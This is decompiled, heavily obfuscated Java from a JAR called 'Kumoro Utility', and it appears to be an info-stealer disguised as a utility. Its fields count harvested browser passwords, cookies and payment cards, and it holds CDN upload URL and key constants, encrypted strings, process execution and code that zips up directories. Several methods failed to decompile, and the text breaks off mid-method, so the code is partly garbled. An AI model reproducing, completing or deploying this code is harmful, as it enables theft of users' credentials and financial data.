package dev.azad1337.p001IlIillIliIlIi.impl;

import dev.azad1337.p000IliIllIilIilIl.C0003v;
import dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.FileVisitOption;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/* renamed from: dev.azad1337.IılİIıilİlIıİliIılİIıi.impl.G */
/* loaded from: Kumoro Utility 3.1.6.jar:dev/azad1337/IılİIıilİlIıİliIılİIıi/impl/G.class */
public class C0006G implements InterfaceC0005T {
    private boolean enabled;
    private String identifier;
    private String basePath;
    private String browserDir;
    private int totalPasswords;
    private int totalCookies;
    private int totalCards;
    private boolean running;
    private static final String CDN_API_URL;
    private static final String CDN_API_KEY;
    private static final String CDN_DOWNLOAD_BASE;
    private static final Map<String, d> BROWSERS;

    /* renamed from: a */
    public static boolean f24a;

    /* renamed from: b */
    private static final String[] f25b;

    /* renamed from: c */
    private static final String[] f26c;

    /* renamed from: d */
    private static final long[] f27d;

    /* renamed from: e */
    private static final Integer[] f28e;

    /* renamed from: f */
    private static final long[] f29f;

    /* renamed from: g */
    private static final Long[] f30g;

    /*  JADX ERROR: Failed to decode insn: 0x01DC: MOVE_MULTI, method: dev.azad1337.IılİIıilİlIıİliIılİIıi.impl.G.d(java.lang.Object[]):void
        java.lang.ArrayIndexOutOfBoundsException: arraycopy: source index -1 out of bounds for object array[10]
        	at java.base/java.lang.System.arraycopy(Native Method)
        	at jadx.plugins.input.java.data.code.StackState.insert(StackState.java:49)
        	at jadx.plugins.input.java.data.code.CodeDecodeState.insert(CodeDecodeState.java:118)
        	at jadx.plugins.input.java.data.code.JavaInsnsRegister.dup2x1(JavaInsnsRegister.java:313)
        	at jadx.plugins.input.java.data.code.JavaInsnData.decode(JavaInsnData.java:46)
        	at jadx.core.dex.instructions.InsnDecoder.lambda$process$0(InsnDecoder.java:54)
        	at jadx.plugins.input.java.data.code.JavaCodeReader.visitInstructions(JavaCodeReader.java:81)
        	at jadx.core.dex.instructions.InsnDecoder.process(InsnDecoder.java:50)
        	at jadx.core.dex.nodes.MethodNode.load(MethodNode.java:156)
        	at jadx.core.dex.nodes.ClassNode.load(ClassNode.java:443)
        	at jadx.core.ProcessClass.process(ProcessClass.java:70)
        	at jadx.core.ProcessClass.generateCode(ProcessClass.java:118)
        	at jadx.core.dex.nodes.ClassNode.generateClassCode(ClassNode.java:400)
        	at jadx.core.dex.nodes.ClassNode.decompile(ClassNode.java:388)
        	at jadx.core.dex.nodes.ClassNode.getCode(ClassNode.java:338)
        */
    /* renamed from: d */
    private void m68d(java.lang.Object[] r11) {
        /*
            Method dump skipped, instructions count: 511
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: dev.azad1337.p001IlIillIliIlIi.impl.C0006G.m68d(java.lang.Object[]):void");
    }

    /* renamed from: a */
    private static String m69a(int i, int i2, int i3) {
        int i4;
        int i5 = ((i ^ i3) ^ (-8146)) & 65535;
        if (f26c[i5] == null) {
            char[] charArray = f25b[i5].toCharArray();
            switch (charArray[0] & 255) {
                case 0:
                    i4 = 184;
                    break;
                case 1:
                    i4 = 161;
                    break;
                case 2:
                    i4 = 69;
                    break;
                case 3:
                    i4 = 186;
                    break;
                case 4:
                    i4 = 45;
                    break;
                case 5:
                    i4 = 236;
                    break;
                case 6:
                    i4 = 147;
                    break;
                case 7:
                    i4 = 117;
                    break;
                case 8:
                    i4 = 35;
                    break;
                case 9:
                    i4 = 179;
                    break;
                case 10:
                    i4 = 27;
                    break;
                case 11:
                    i4 = 227;
                    break;
                case 12:
                    i4 = 165;
                    break;
                case 13:
                    i4 = 33;
                    break;
                case 14:
                    i4 = 98;
                    break;
                case 15:
                    i4 = 102;
                    break;
                case 16:
                    i4 = 155;
                    break;
                case 17:
                    i4 = 82;
                    break;
                case 18:
                    i4 = 221;
                    break;
                case 19:
                    i4 = 246;
                    break;
                case 20:
                    i4 = 37;
                    break;
                case 21:
                    i4 = 126;
                    break;
                case 22:
                    i4 = 25;
                    break;
                case 23:
                    i4 = 81;
                    break;
                case 24:
                    i4 = 53;
                    break;
                case 25:
                    i4 = 108;
                    break;
                case 26:
                    i4 = 226;
                    break;
                case 27:
                    i4 = 123;
                    break;
                case 28:
                    i4 = 62;
                    break;
                case 29:
                    i4 = 150;
                    break;
                case 30:
                    i4 = 6;
                    break;
                case 31:
                    i4 = 136;
                    break;
                case 32:
                    i4 = 241;
                    break;
                case 33:
                    i4 = 166;
                    break;
                case 34:
                    i4 = 152;
                    break;
                case 35:
                    i4 = 101;
                    break;
                case 36:
                    i4 = 66;
                    break;
                case 37:
                    i4 = 87;
                    break;
                case 38:
                    i4 = 193;
                    break;
                case 39:
                    i4 = 113;
                    break;
                case 40:
                    i4 = 52;
                    break;
                case 41:
                    i4 = 109;
                    break;
                case 42:
                    i4 = 247;
                    break;
                case 43:
                    i4 = 3;
                    break;
                case 44:
                    i4 = 106;
                    break;
                case 45:
                    i4 = 23;
                    break;
                case 46:
                    i4 = 127;
                    break;
                case 47:
                    i4 = 164;
                    break;
                case 48:
                    i4 = 85;
                    break;
                case 49:
                    i4 = 119;
                    break;
                case 50:
                    i4 = 104;
                    break;
                case 51:
                    i4 = 41;
                    break;
                case 52:
                    i4 = 67;
                    break;
                case 53:
                    i4 = 129;
                    break;
                case 54:
                    i4 = 248;
                    break;
                case 55:
                    i4 = 235;
                    break;
                case 56:
                    i4 = 107;
                    break;
                case 57:
                    i4 = 48;
                    break;
                case 58:
                    i4 = 8;
                    break;
                case 59:
                    i4 = 142;
                    break;
                case 60:
                    i4 = 195;
                    break;
                case 61:
                    i4 = 46;
                    break;
                case 62:
                    i4 = 208;
                    break;
                case 63:
                    i4 = 73;
                    break;
                case 64:
                    i4 = 163;
                    break;
                case 65:
                    i4 = 234;
                    break;
                case 66:
                    i4 = 116;
                    break;
                case 67:
                    i4 = 146;
                    break;
                case 68:
                    i4 = 21;
                    break;
                case 69:
                    i4 = 185;
                    break;
                case 70:
                    i4 = 36;
                    break;
                case 71:
                    i4 = 57;
                    break;
                case 72:
                    i4 = 175;
                    break;
                case 73:
                    i4 = 7;
                    break;
                case 74:
                    i4 = 138;
                    break;
                case 75:
                    i4 = 216;
                    break;
                case 76:
                    i4 = 18;
                    break;
                case 77:
                    i4 = 96;
                    break;
                case 78:
                    i4 = 177;
                    break;
                case 79:
                    i4 = 231;
                    break;
                case 80:
                    i4 = 105;
                    break;
                case 81:
                    i4 = 122;
                    break;
                case 82:
                    i4 = 167;
                    break;
                case 83:
                    i4 = 169;
                    break;
                case 84:
                    i4 = 131;
                    break;
                case 85:
                    i4 = 86;
                    break;
                case 86:
                    i4 = 0;
                    break;
                case 87:
                    i4 = 64;
                    break;
                case 88:
                    i4 = 174;
                    break;
                case 89:
                    i4 = 178;
                    break;
                case 90:
                    i4 = 160;
                    break;
                case 91:
                    i4 = 100;
                    break;
                case 92:
                    i4 = 189;
                    break;
                case 93:
                    i4 = 132;
                    break;
                case 94:
                    i4 = 162;
                    break;
                case 95:
                    i4 = 200;
                    break;
                case 96:
                    i4 = 148;
                    break;
                case 97:
                    i4 = 95;
                    break;
                case 98:
                    i4 = 245;
                    break;
                case 99:
                    i4 = 198;
                    break;
                case 100:
                    i4 = 30;
                    break;
                case 101:
                    i4 = 202;
                    break;
                case 102:
                    i4 = 135;
                    break;
                case 103:
                    i4 = 143;
                    break;
                case 104:
                    i4 = 68;
                    break;
                case 105:
                    i4 = 59;
                    break;
                case 106:
                    i4 = 42;
                    break;
                case 107:
                    i4 = 181;
                    break;
                case 108:
                    i4 = 233;
                    break;
                case 109:
                    i4 = 168;
                    break;
                case 110:
                    i4 = 220;
                    break;
                case 111:
                    i4 = 224;
                    break;
                case 112:
                    i4 = 173;
                    break;
                case 113:
                    i4 = 55;
                    break;
                case 114:
                    i4 = 204;
                    break;
                case 115:
                    i4 = 70;
                    break;
                case 116:
                    i4 = 218;
                    break;
                case 117:
                    i4 = 60;
                    break;
                case 118:
                    i4 = 12;
                    break;
                case 119:
                    i4 = 40;
                    break;
                case 120:
                    i4 = 49;
                    break;
                case 121:
                    i4 = 225;
                    break;
                case 122:
                    i4 = 171;
                    break;
                case 123:
                    i4 = 254;
                    break;
                case 124:
                    i4 = 211;
                    break;
                case 125:
                    i4 = 124;
                    break;
                case 126:
                    i4 = 158;
                    break;
                case 127:
                    i4 = 209;
                    break;
                case 128:
                    i4 = 228;
                    break;
                case 129:
                    i4 = 238;
                    break;
                case 130:
                    i4 = 159;
                    break;
                case 131:
                    i4 = 145;
                    break;
                case 132:
                    i4 = 249;
                    break;
                case 133:
                    i4 = 205;
                    break;
                case 134:
                    i4 = 121;
                    break;
                case 135:
                    i4 = 111;
                    break;
                case 136:
                    i4 = 71;
                    break;
                case 137:
                    i4 = 250;
                    break;
                case 138:
                    i4 = 88;
                    break;
                case 139:
                    i4 = 16;
                    break;
                case 140:
                    i4 = 24;
                    break;
                case 141:
                    i4 = 139;
                    break;
                case 142:
                    i4 = 94;
                    break;
                case 143:
                    i4 = 183;
                    break;
                case 144:
                    i4 = 237;
                    break;
                case 145:
                    i4 = 43;
                    break;
                case 146:
                    i4 = 214;
                    break;
                case 147:
                    i4 = 110;
                    break;
                case 148:
                    i4 = 120;
                    break;
                case 149:
                    i4 = 140;
                    break;
                case 150:
                    i4 = 93;
                    break;
                case 151:
                    i4 = 78;
                    break;
                case 152:
                    i4 = 199;
                    break;
                case 153:
                    i4 = 240;
                    break;
                case 154:
                    i4 = 243;
                    break;
                case 155:
                    i4 = 134;
                    break;
                case 156:
                    i4 = 50;
                    break;
                case 157:
                    i4 = 154;
                    break;
                case 158:
                    i4 = 79;
                    break;
                case 159:
                    i4 = 212;
                    break;
                case 160:
                    i4 = 51;
                    break;
                case 161:
                    i4 = 5;
                    break;
                case 162:
                    i4 = 32;
                    break;
                case 163:
                    i4 = 26;
                    break;
                case 164:
                    i4 = 215;
                    break;
                case 165:
                    i4 = 207;
                    break;
                case 166:
                    i4 = 244;
                    break;
                case 167:
                    i4 = 197;
                    break;
                case 168:
                    i4 = 149;
                    break;
                case 169:
                    i4 = 29;
                    break;
                case 170:
                    i4 = 156;
                    break;
                case 171:
                    i4 = 56;
                    break;
                case 172:
                    i4 = 103;
                    break;
                case 173:
                    i4 = 38;
                    break;
                case 174:
                    i4 = 99;
                    break;
                case 175:
                    i4 = 239;
                    break;
                case 176:
                    i4 = 2;
                    break;
                case 177:
                    i4 = 118;
                    break;
                case 178:
                    i4 = 91;
                    break;
                case 179:
                    i4 = 176;
                    break;
                case 180:
                    i4 = 20;
                    break;
                case 181:
                    i4 = 180;
                    break;
                case 182:
                    i4 = 63;
                    break;
                case 183:
                    i4 = 89;
                    break;
                case 184:
                    i4 = 34;
                    break;
                case 185:
                    i4 = 10;
                    break;
                case 186:
                    i4 = 194;
                    break;
                case 187:
                    i4 = 196;
                    break;
                case 188:
                    i4 = 153;
                    break;
                case 189:
                    i4 = 252;
                    break;
                case 190:
                    i4 = 14;
                    break;
                case 191:
                    i4 = 47;
                    break;
                case 192:
                    i4 = 255;
                    break;
                case 193:
                    i4 = 28;
                    break;
                case 194:
                    i4 = 251;
                    break;
                case 195:
                    i4 = 75;
                    break;
                case 196:
                    i4 = 130;
                    break;
                case 197:
                    i4 = 22;
                    break;
                case 198:
                    i4 = 151;
                    break;
                case 199:
                    i4 = 15;
                    break;
                case 200:
                    i4 = 223;
                    break;
                case 201:
                    i4 = 54;
                    break;
                case 202:
                    i4 = 157;
                    break;
                case 203:
                    i4 = 1;
                    break;
                case 204:
                    i4 = 17;
                    break;
                case 205:
                    i4 = 13;
                    break;
                case 206:
                    i4 = 80;
                    break;
                case 207:
                    i4 = 76;
                    break;
                case 208:
                    i4 = 187;
                    break;
                case 209:
                    i4 = 170;
                    break;
                case 210:
                    i4 = 192;
                    break;
                case 211:
                    i4 = 19;
                    break;
                case 212:
                    i4 = 190;
                    break;
                case 213:
                    i4 = 74;
                    break;
                case 214:
                    i4 = 232;
                    break;
                case 215:
                    i4 = 128;
                    break;
                case 216:
                    i4 = 92;
                    break;
                case 217:
                    i4 = 97;
                    break;
                case 218:
                    i4 = 182;
                    break;
                case 219:
                    i4 = 213;
                    break;
                case 220:
                    i4 = 137;
                    break;
                case 221:
                    i4 = 188;
                    break;
                case 222:
                    i4 = 229;
                    break;
                case 223:
                    i4 = 58;
                    break;
                case 224:
                    i4 = 83;
                    break;
                case 225:
                    i4 = 112;
                    break;
                case 226:
                    i4 = 133;
                    break;
                case 227:
                    i4 = 39;
                    break;
                case 228:
                    i4 = 144;
                    break;
                case 229:
                    i4 = 44;
                    break;
                case 230:
                    i4 = 77;
                    break;
                case 231:
                    i4 = 222;
                    break;
                case 232:
                    i4 = 114;
                    break;
                case 233:
                    i4 = 172;
                    break;
                case 234:
                    i4 = 219;
                    break;
                case 235:
                    i4 = 61;
                    break;
                case 236:
                    i4 = 217;
                    break;
                case 237:
                    i4 = 125;
                    break;
                case 238:
                    i4 = 201;
                    break;
                case 239:
                    i4 = 242;
                    break;
                case 240:
                    i4 = 203;
                    break;
                case 241:
                    i4 = 191;
                    break;
                case 242:
                    i4 = 31;
                    break;
                case 243:
                    i4 = 230;
                    break;
                case 244:
                    i4 = 4;
                    break;
                case 245:
                    i4 = 84;
                    break;
                case 246:
                    i4 = 9;
                    break;
                case 247:
                    i4 = 115;
                    break;
                case 248:
                    i4 = 206;
                    break;
                case 249:
                    i4 = 65;
                    break;
                case 250:
                    i4 = 11;
                    break;
                case 251:
                    i4 = 72;
                    break;
                case 252:
                    i4 = 253;
                    break;
                case 253:
                    i4 = 210;
                    break;
                case 254:
                    i4 = 141;
                    break;
                default:
                    i4 = 90;
                    break;
            }
            int i6 = i4;
            int i7 = i2 ^ i3;
            int i8 = (i7 & 255) - i6;
            if (i8 < 0) {
                i8 += 256;
            }
            int i9 = ((i7 & 65535) >>> 8) - i6;
            if (i9 < 0) {
                i9 += 256;
            }
            for (int i10 = 0; i10 < charArray.length; i10++) {
                int i11 = i10 % 2;
                int i12 = i10;
                char c = charArray[i12];
                if (i11 == 0) {
                    charArray[i12] = (char) (c ^ i8);
                    i8 = (((i8 >>> 3) | (i8 << 5)) ^ charArray[i10]) & 255;
                } else {
                    charArray[i12] = (char) (c ^ i9);
                    i9 = (((i9 >>> 3) | (i9 << 5)) ^ charArray[i10]) & 255;
                }
            }
            f26c[i5] = new String(charArray).intern();
        }
        return f26c[i5];
    }

    /* renamed from: a */
    private static int m70a(int i, long j) {
        int i2 = (i ^ ((int) (j & 32767))) ^ 4307;
        if (f28e[i2] == null) {
            f28e[i2] = Integer.valueOf((int) (f27d[i2] ^ j));
        }
        return f28e[i2].intValue();
    }

    /* renamed from: b */
    private static long m71b(int i, long j) {
        int i2 = ((i ^ ((int) j)) ^ 13771) & 32767;
        if (f30g[i2] == null) {
            f30g[i2] = Long.valueOf(f29f[i2] ^ j);
        }
        return f30g[i2].longValue();
    }

    /* renamed from: dev.azad1337.IılİIıilİlIıİliIılİIıi.impl.G$d */
    /* loaded from: Kumoro Utility 3.1.6.jar:dev/azad1337/IılİIıilİlIıİliIılİIıi/impl/G$d.class */
    private static class d {
        String name;
        String type;
        String dataPath;
        String localStoragePath;
        String processName;

        d(String a, String a2, String a3, long a4, String a5, String a6) {
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, a, -589687582465737873L, a4) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, a2, -634017211094624929L, a4) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, a3, -591699247103680314L, a4) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, a5, -593992698757225966L, a4) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, a6, -593551035641811005L, a4) /* invoke-custom */;
        }
    }

    /*  JADX ERROR: IndexOutOfBoundsException in pass: SSATransform
        java.lang.IndexOutOfBoundsException: bitIndex < 0: -1
        	at java.base/java.util.BitSet.get(BitSet.java:628)
        	at jadx.core.dex.visitors.ssa.LiveVarAnalysis.fillBasicBlockInfo(LiveVarAnalysis.java:65)
        	at jadx.core.dex.visitors.ssa.LiveVarAnalysis.runAnalysis(LiveVarAnalysis.java:36)
        	at jadx.core.dex.visitors.ssa.SSATransform.process(SSATransform.java:58)
        	at jadx.core.dex.visitors.ssa.SSATransform.visit(SSATransform.java:44)
        */
    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    /* renamed from: n */
    private void m62n(java.lang.Object[] r12) {
        /*
            Method dump skipped, instructions count: 298
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: dev.azad1337.p001IlIillIliIlIi.impl.C0006G.m62n(java.lang.Object[]):void");
    }

    /* JADX WARN: Code restructure failed: missing block: B:9:?, code lost:
    
        throw r9;
     */
    /* JADX WARN: Type inference failed for: r0v6, types: [java.lang.Throwable, java.lang.String] */
    /* renamed from: O */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private void m55O(Object[] a) {
        long a2 = ((Long) a[0]).longValue();
        long a3 = a2 ^ 50243484181590L;
        long a4 = a2 ^ 82738292553067L;
        try {
            ?? r0 = (String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m69a((-1138867230) - 25028, 48158 + ((char) (-22617)), (int) a2), 154750610657019379L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(154656760625425015L, a2) /* invoke-custom */ + m69a((-1138867230) - 24997, (-1138867230) - 19861, (int) a2);
            try {
                if (!(boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new File((String) r0), 159635187995694370L, a2) /* invoke-custom */) {
                    Object m69a = m69a((-1138867230) - 24948, (-1138867230) - 30728, (int) a2);
                    Object[] objArr = new Object[3];
                    r0[2] = Long.valueOf(a4);
                    objArr[1] = objArr;
                    objArr[0] = m69a;
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, objArr, 208831807782188991L, a2) /* invoke-custom */;
                }
                (Process) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Process.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Runtime) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Runtime.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(161466803858411472L, a2) /* invoke-custom */, m69a((-1138867230) - 24974, 1138867230 + 26011, (int) a2) + r0 + m69a((-1138867230) - 24943, 48158 + ((char) (-22380)), (int) a2) + (String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 159556656130649844L, a2) /* invoke-custom */ + m69a((-1138867230) - 25034, 48158 + ((char) (-30343)), (int) a2), 162001978730013049L, a2) /* invoke-custom */;
                Object[] objArr2 = new Object[1];
                this[0] = Long.valueOf(a3);
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(objArr2, objArr2, 150750732662617413L, a2) /* invoke-custom */;
            } catch (Exception unused) {
                throw r0;
            }
        } catch (Exception e) {
        }
    }

    /* renamed from: s */
    private void m66s(Object[] a) throws IOException {
        long a2 = ((Long) a[0]).longValue();
        String a3 = (String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m69a(32780 - ((char) (-18194)), (-2146664460) - (-((char) (-14639))), (int) a2), 2820827311372476659L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(2820709274158616439L, a2) /* invoke-custom */ + (String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 2825591279010204660L, a2) /* invoke-custom */ + m69a(32780 - ((char) (-18226)), 32780 - ((char) (-25221)), (int) a2);
        Path a4 = (Path) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Path.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((String) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 2816799718483876458L, a2) /* invoke-custom */, new String[0], 2810921791471567731L, a2) /* invoke-custom */;
        ZipOutputStream a5 = new ZipOutputStream(new FileOutputStream(a3));
        try {
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Stream) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Stream.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((Stream) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Stream.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, new FileVisitOption[0], 2822874188652992166L, a2) /* invoke-custom */, a6 -> {
                try {
                    ?? r0 = (boolean) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, new LinkOption[0], 9025775613114095060L, 69899815910708L) /* invoke-custom */;
                    return r0 == 0;
                } catch (RuntimeException unused) {
                    throw 69899815910708;
                }
            }, 2814487691733694584L, a2) /* invoke-custom */, a7 -> {
                try {
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, new ZipEntry((Path) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Path.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, a7, -1670764381392453393L, 53320566302879L) /* invoke-custom */.toString()), -1725819518759920530L, 53320566302879L) /* invoke-custom */;
                    (long) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Long.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a7, a5, -1726700179712583775L, 53320566302879L) /* invoke-custom */;
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, -1668609514609370287L, 53320566302879L) /* invoke-custom */;
                } catch (IOException e) {
                }
            }, 2818255404382813975L, a2) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, 2819898539334731864L, a2) /* invoke-custom */;
        } catch (Throwable th) {
            try {
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, 2819898539334731864L, a2) /* invoke-custom */;
            } catch (Throwable th2) {
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(th, th2, 2823700462171832194L, a2) /* invoke-custom */;
            }
            throw th;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:35:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:40:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:?, code lost:
    
        throw r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v13, types: [java.lang.Throwable, java.lang.Object, java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v15, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.io.File[]] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.lang.Throwable, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v9, types: [java.lang.Throwable] */
    /* JADX WARN: Type inference failed for: r1v5, types: [java.lang.Throwable, java.lang.String] */
    /* JADX WARN: Type inference failed for: r1v8, types: [java.lang.StringBuilder, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r5v4, types: [java.lang.Object[], java.lang.Object] */
    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    /* renamed from: z */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private void m64z(Object[] a) {
        String m69a;
        File a2 = (File) a[0];
        ?? r1 = (String) a[1];
        ?? r12 = (StringBuilder) a[2];
        long a3 = ((Long) a[3]).longValue();
        long a4 = a3 ^ 0;
        ?? B = (File[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(File[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a2, -9174385314250112274L, a3) /* invoke-custom */;
        if (B == 0) {
            return;
        }
        for (int a5 = 0; a5 < B.length; a5++) {
            ?? r0 = B[a5];
            try {
                ?? r02 = a5;
                boolean a6 = r02 == B.length - 1;
                if (a6) {
                    try {
                        m69a = m69a(1868271780 - 12271, 1868271780 - 31995, (int) a3);
                    } catch (RuntimeException unused) {
                        throw r1;
                    }
                } else {
                    m69a = m69a(1868271780 - 12290, (-1868271780) - (-28505), (int) a3);
                }
                ?? r03 = r1 + m69a;
                try {
                    ?? B2 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, -9188322402605845708L, a3) /* invoke-custom */;
                    if (B2 != 0) {
                        try {
                            (StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r12, r03, -9182886778774712853L, a3) /* invoke-custom */, m69a(1868271780 - 12255, (-1868271780) - (-25356), (int) a3), -9182886778774712853L, a3) /* invoke-custom */, (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, -9173998726918810642L, a3) /* invoke-custom */, -9182886778774712853L, a3) /* invoke-custom */, "\n", -9182886778774712853L, a3) /* invoke-custom */;
                            String m69a2 = a6 ? m69a(1868271780 - 12315, (-1868271780) - (-19643), (int) a3) : m69a(1868271780 - 12308, (-1868271780) - (-30713), (int) a3);
                            ?? r5 = new Object[4];
                            r12[3] = Long.valueOf(a4);
                            r5[2] = r5;
                            r5[1] = r1 + m69a2;
                            r5[0] = r0;
                            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, r5, -9177681910877210532L, a3) /* invoke-custom */;
                        } catch (RuntimeException unused2) {
                            throw B2;
                        }
                    } else {
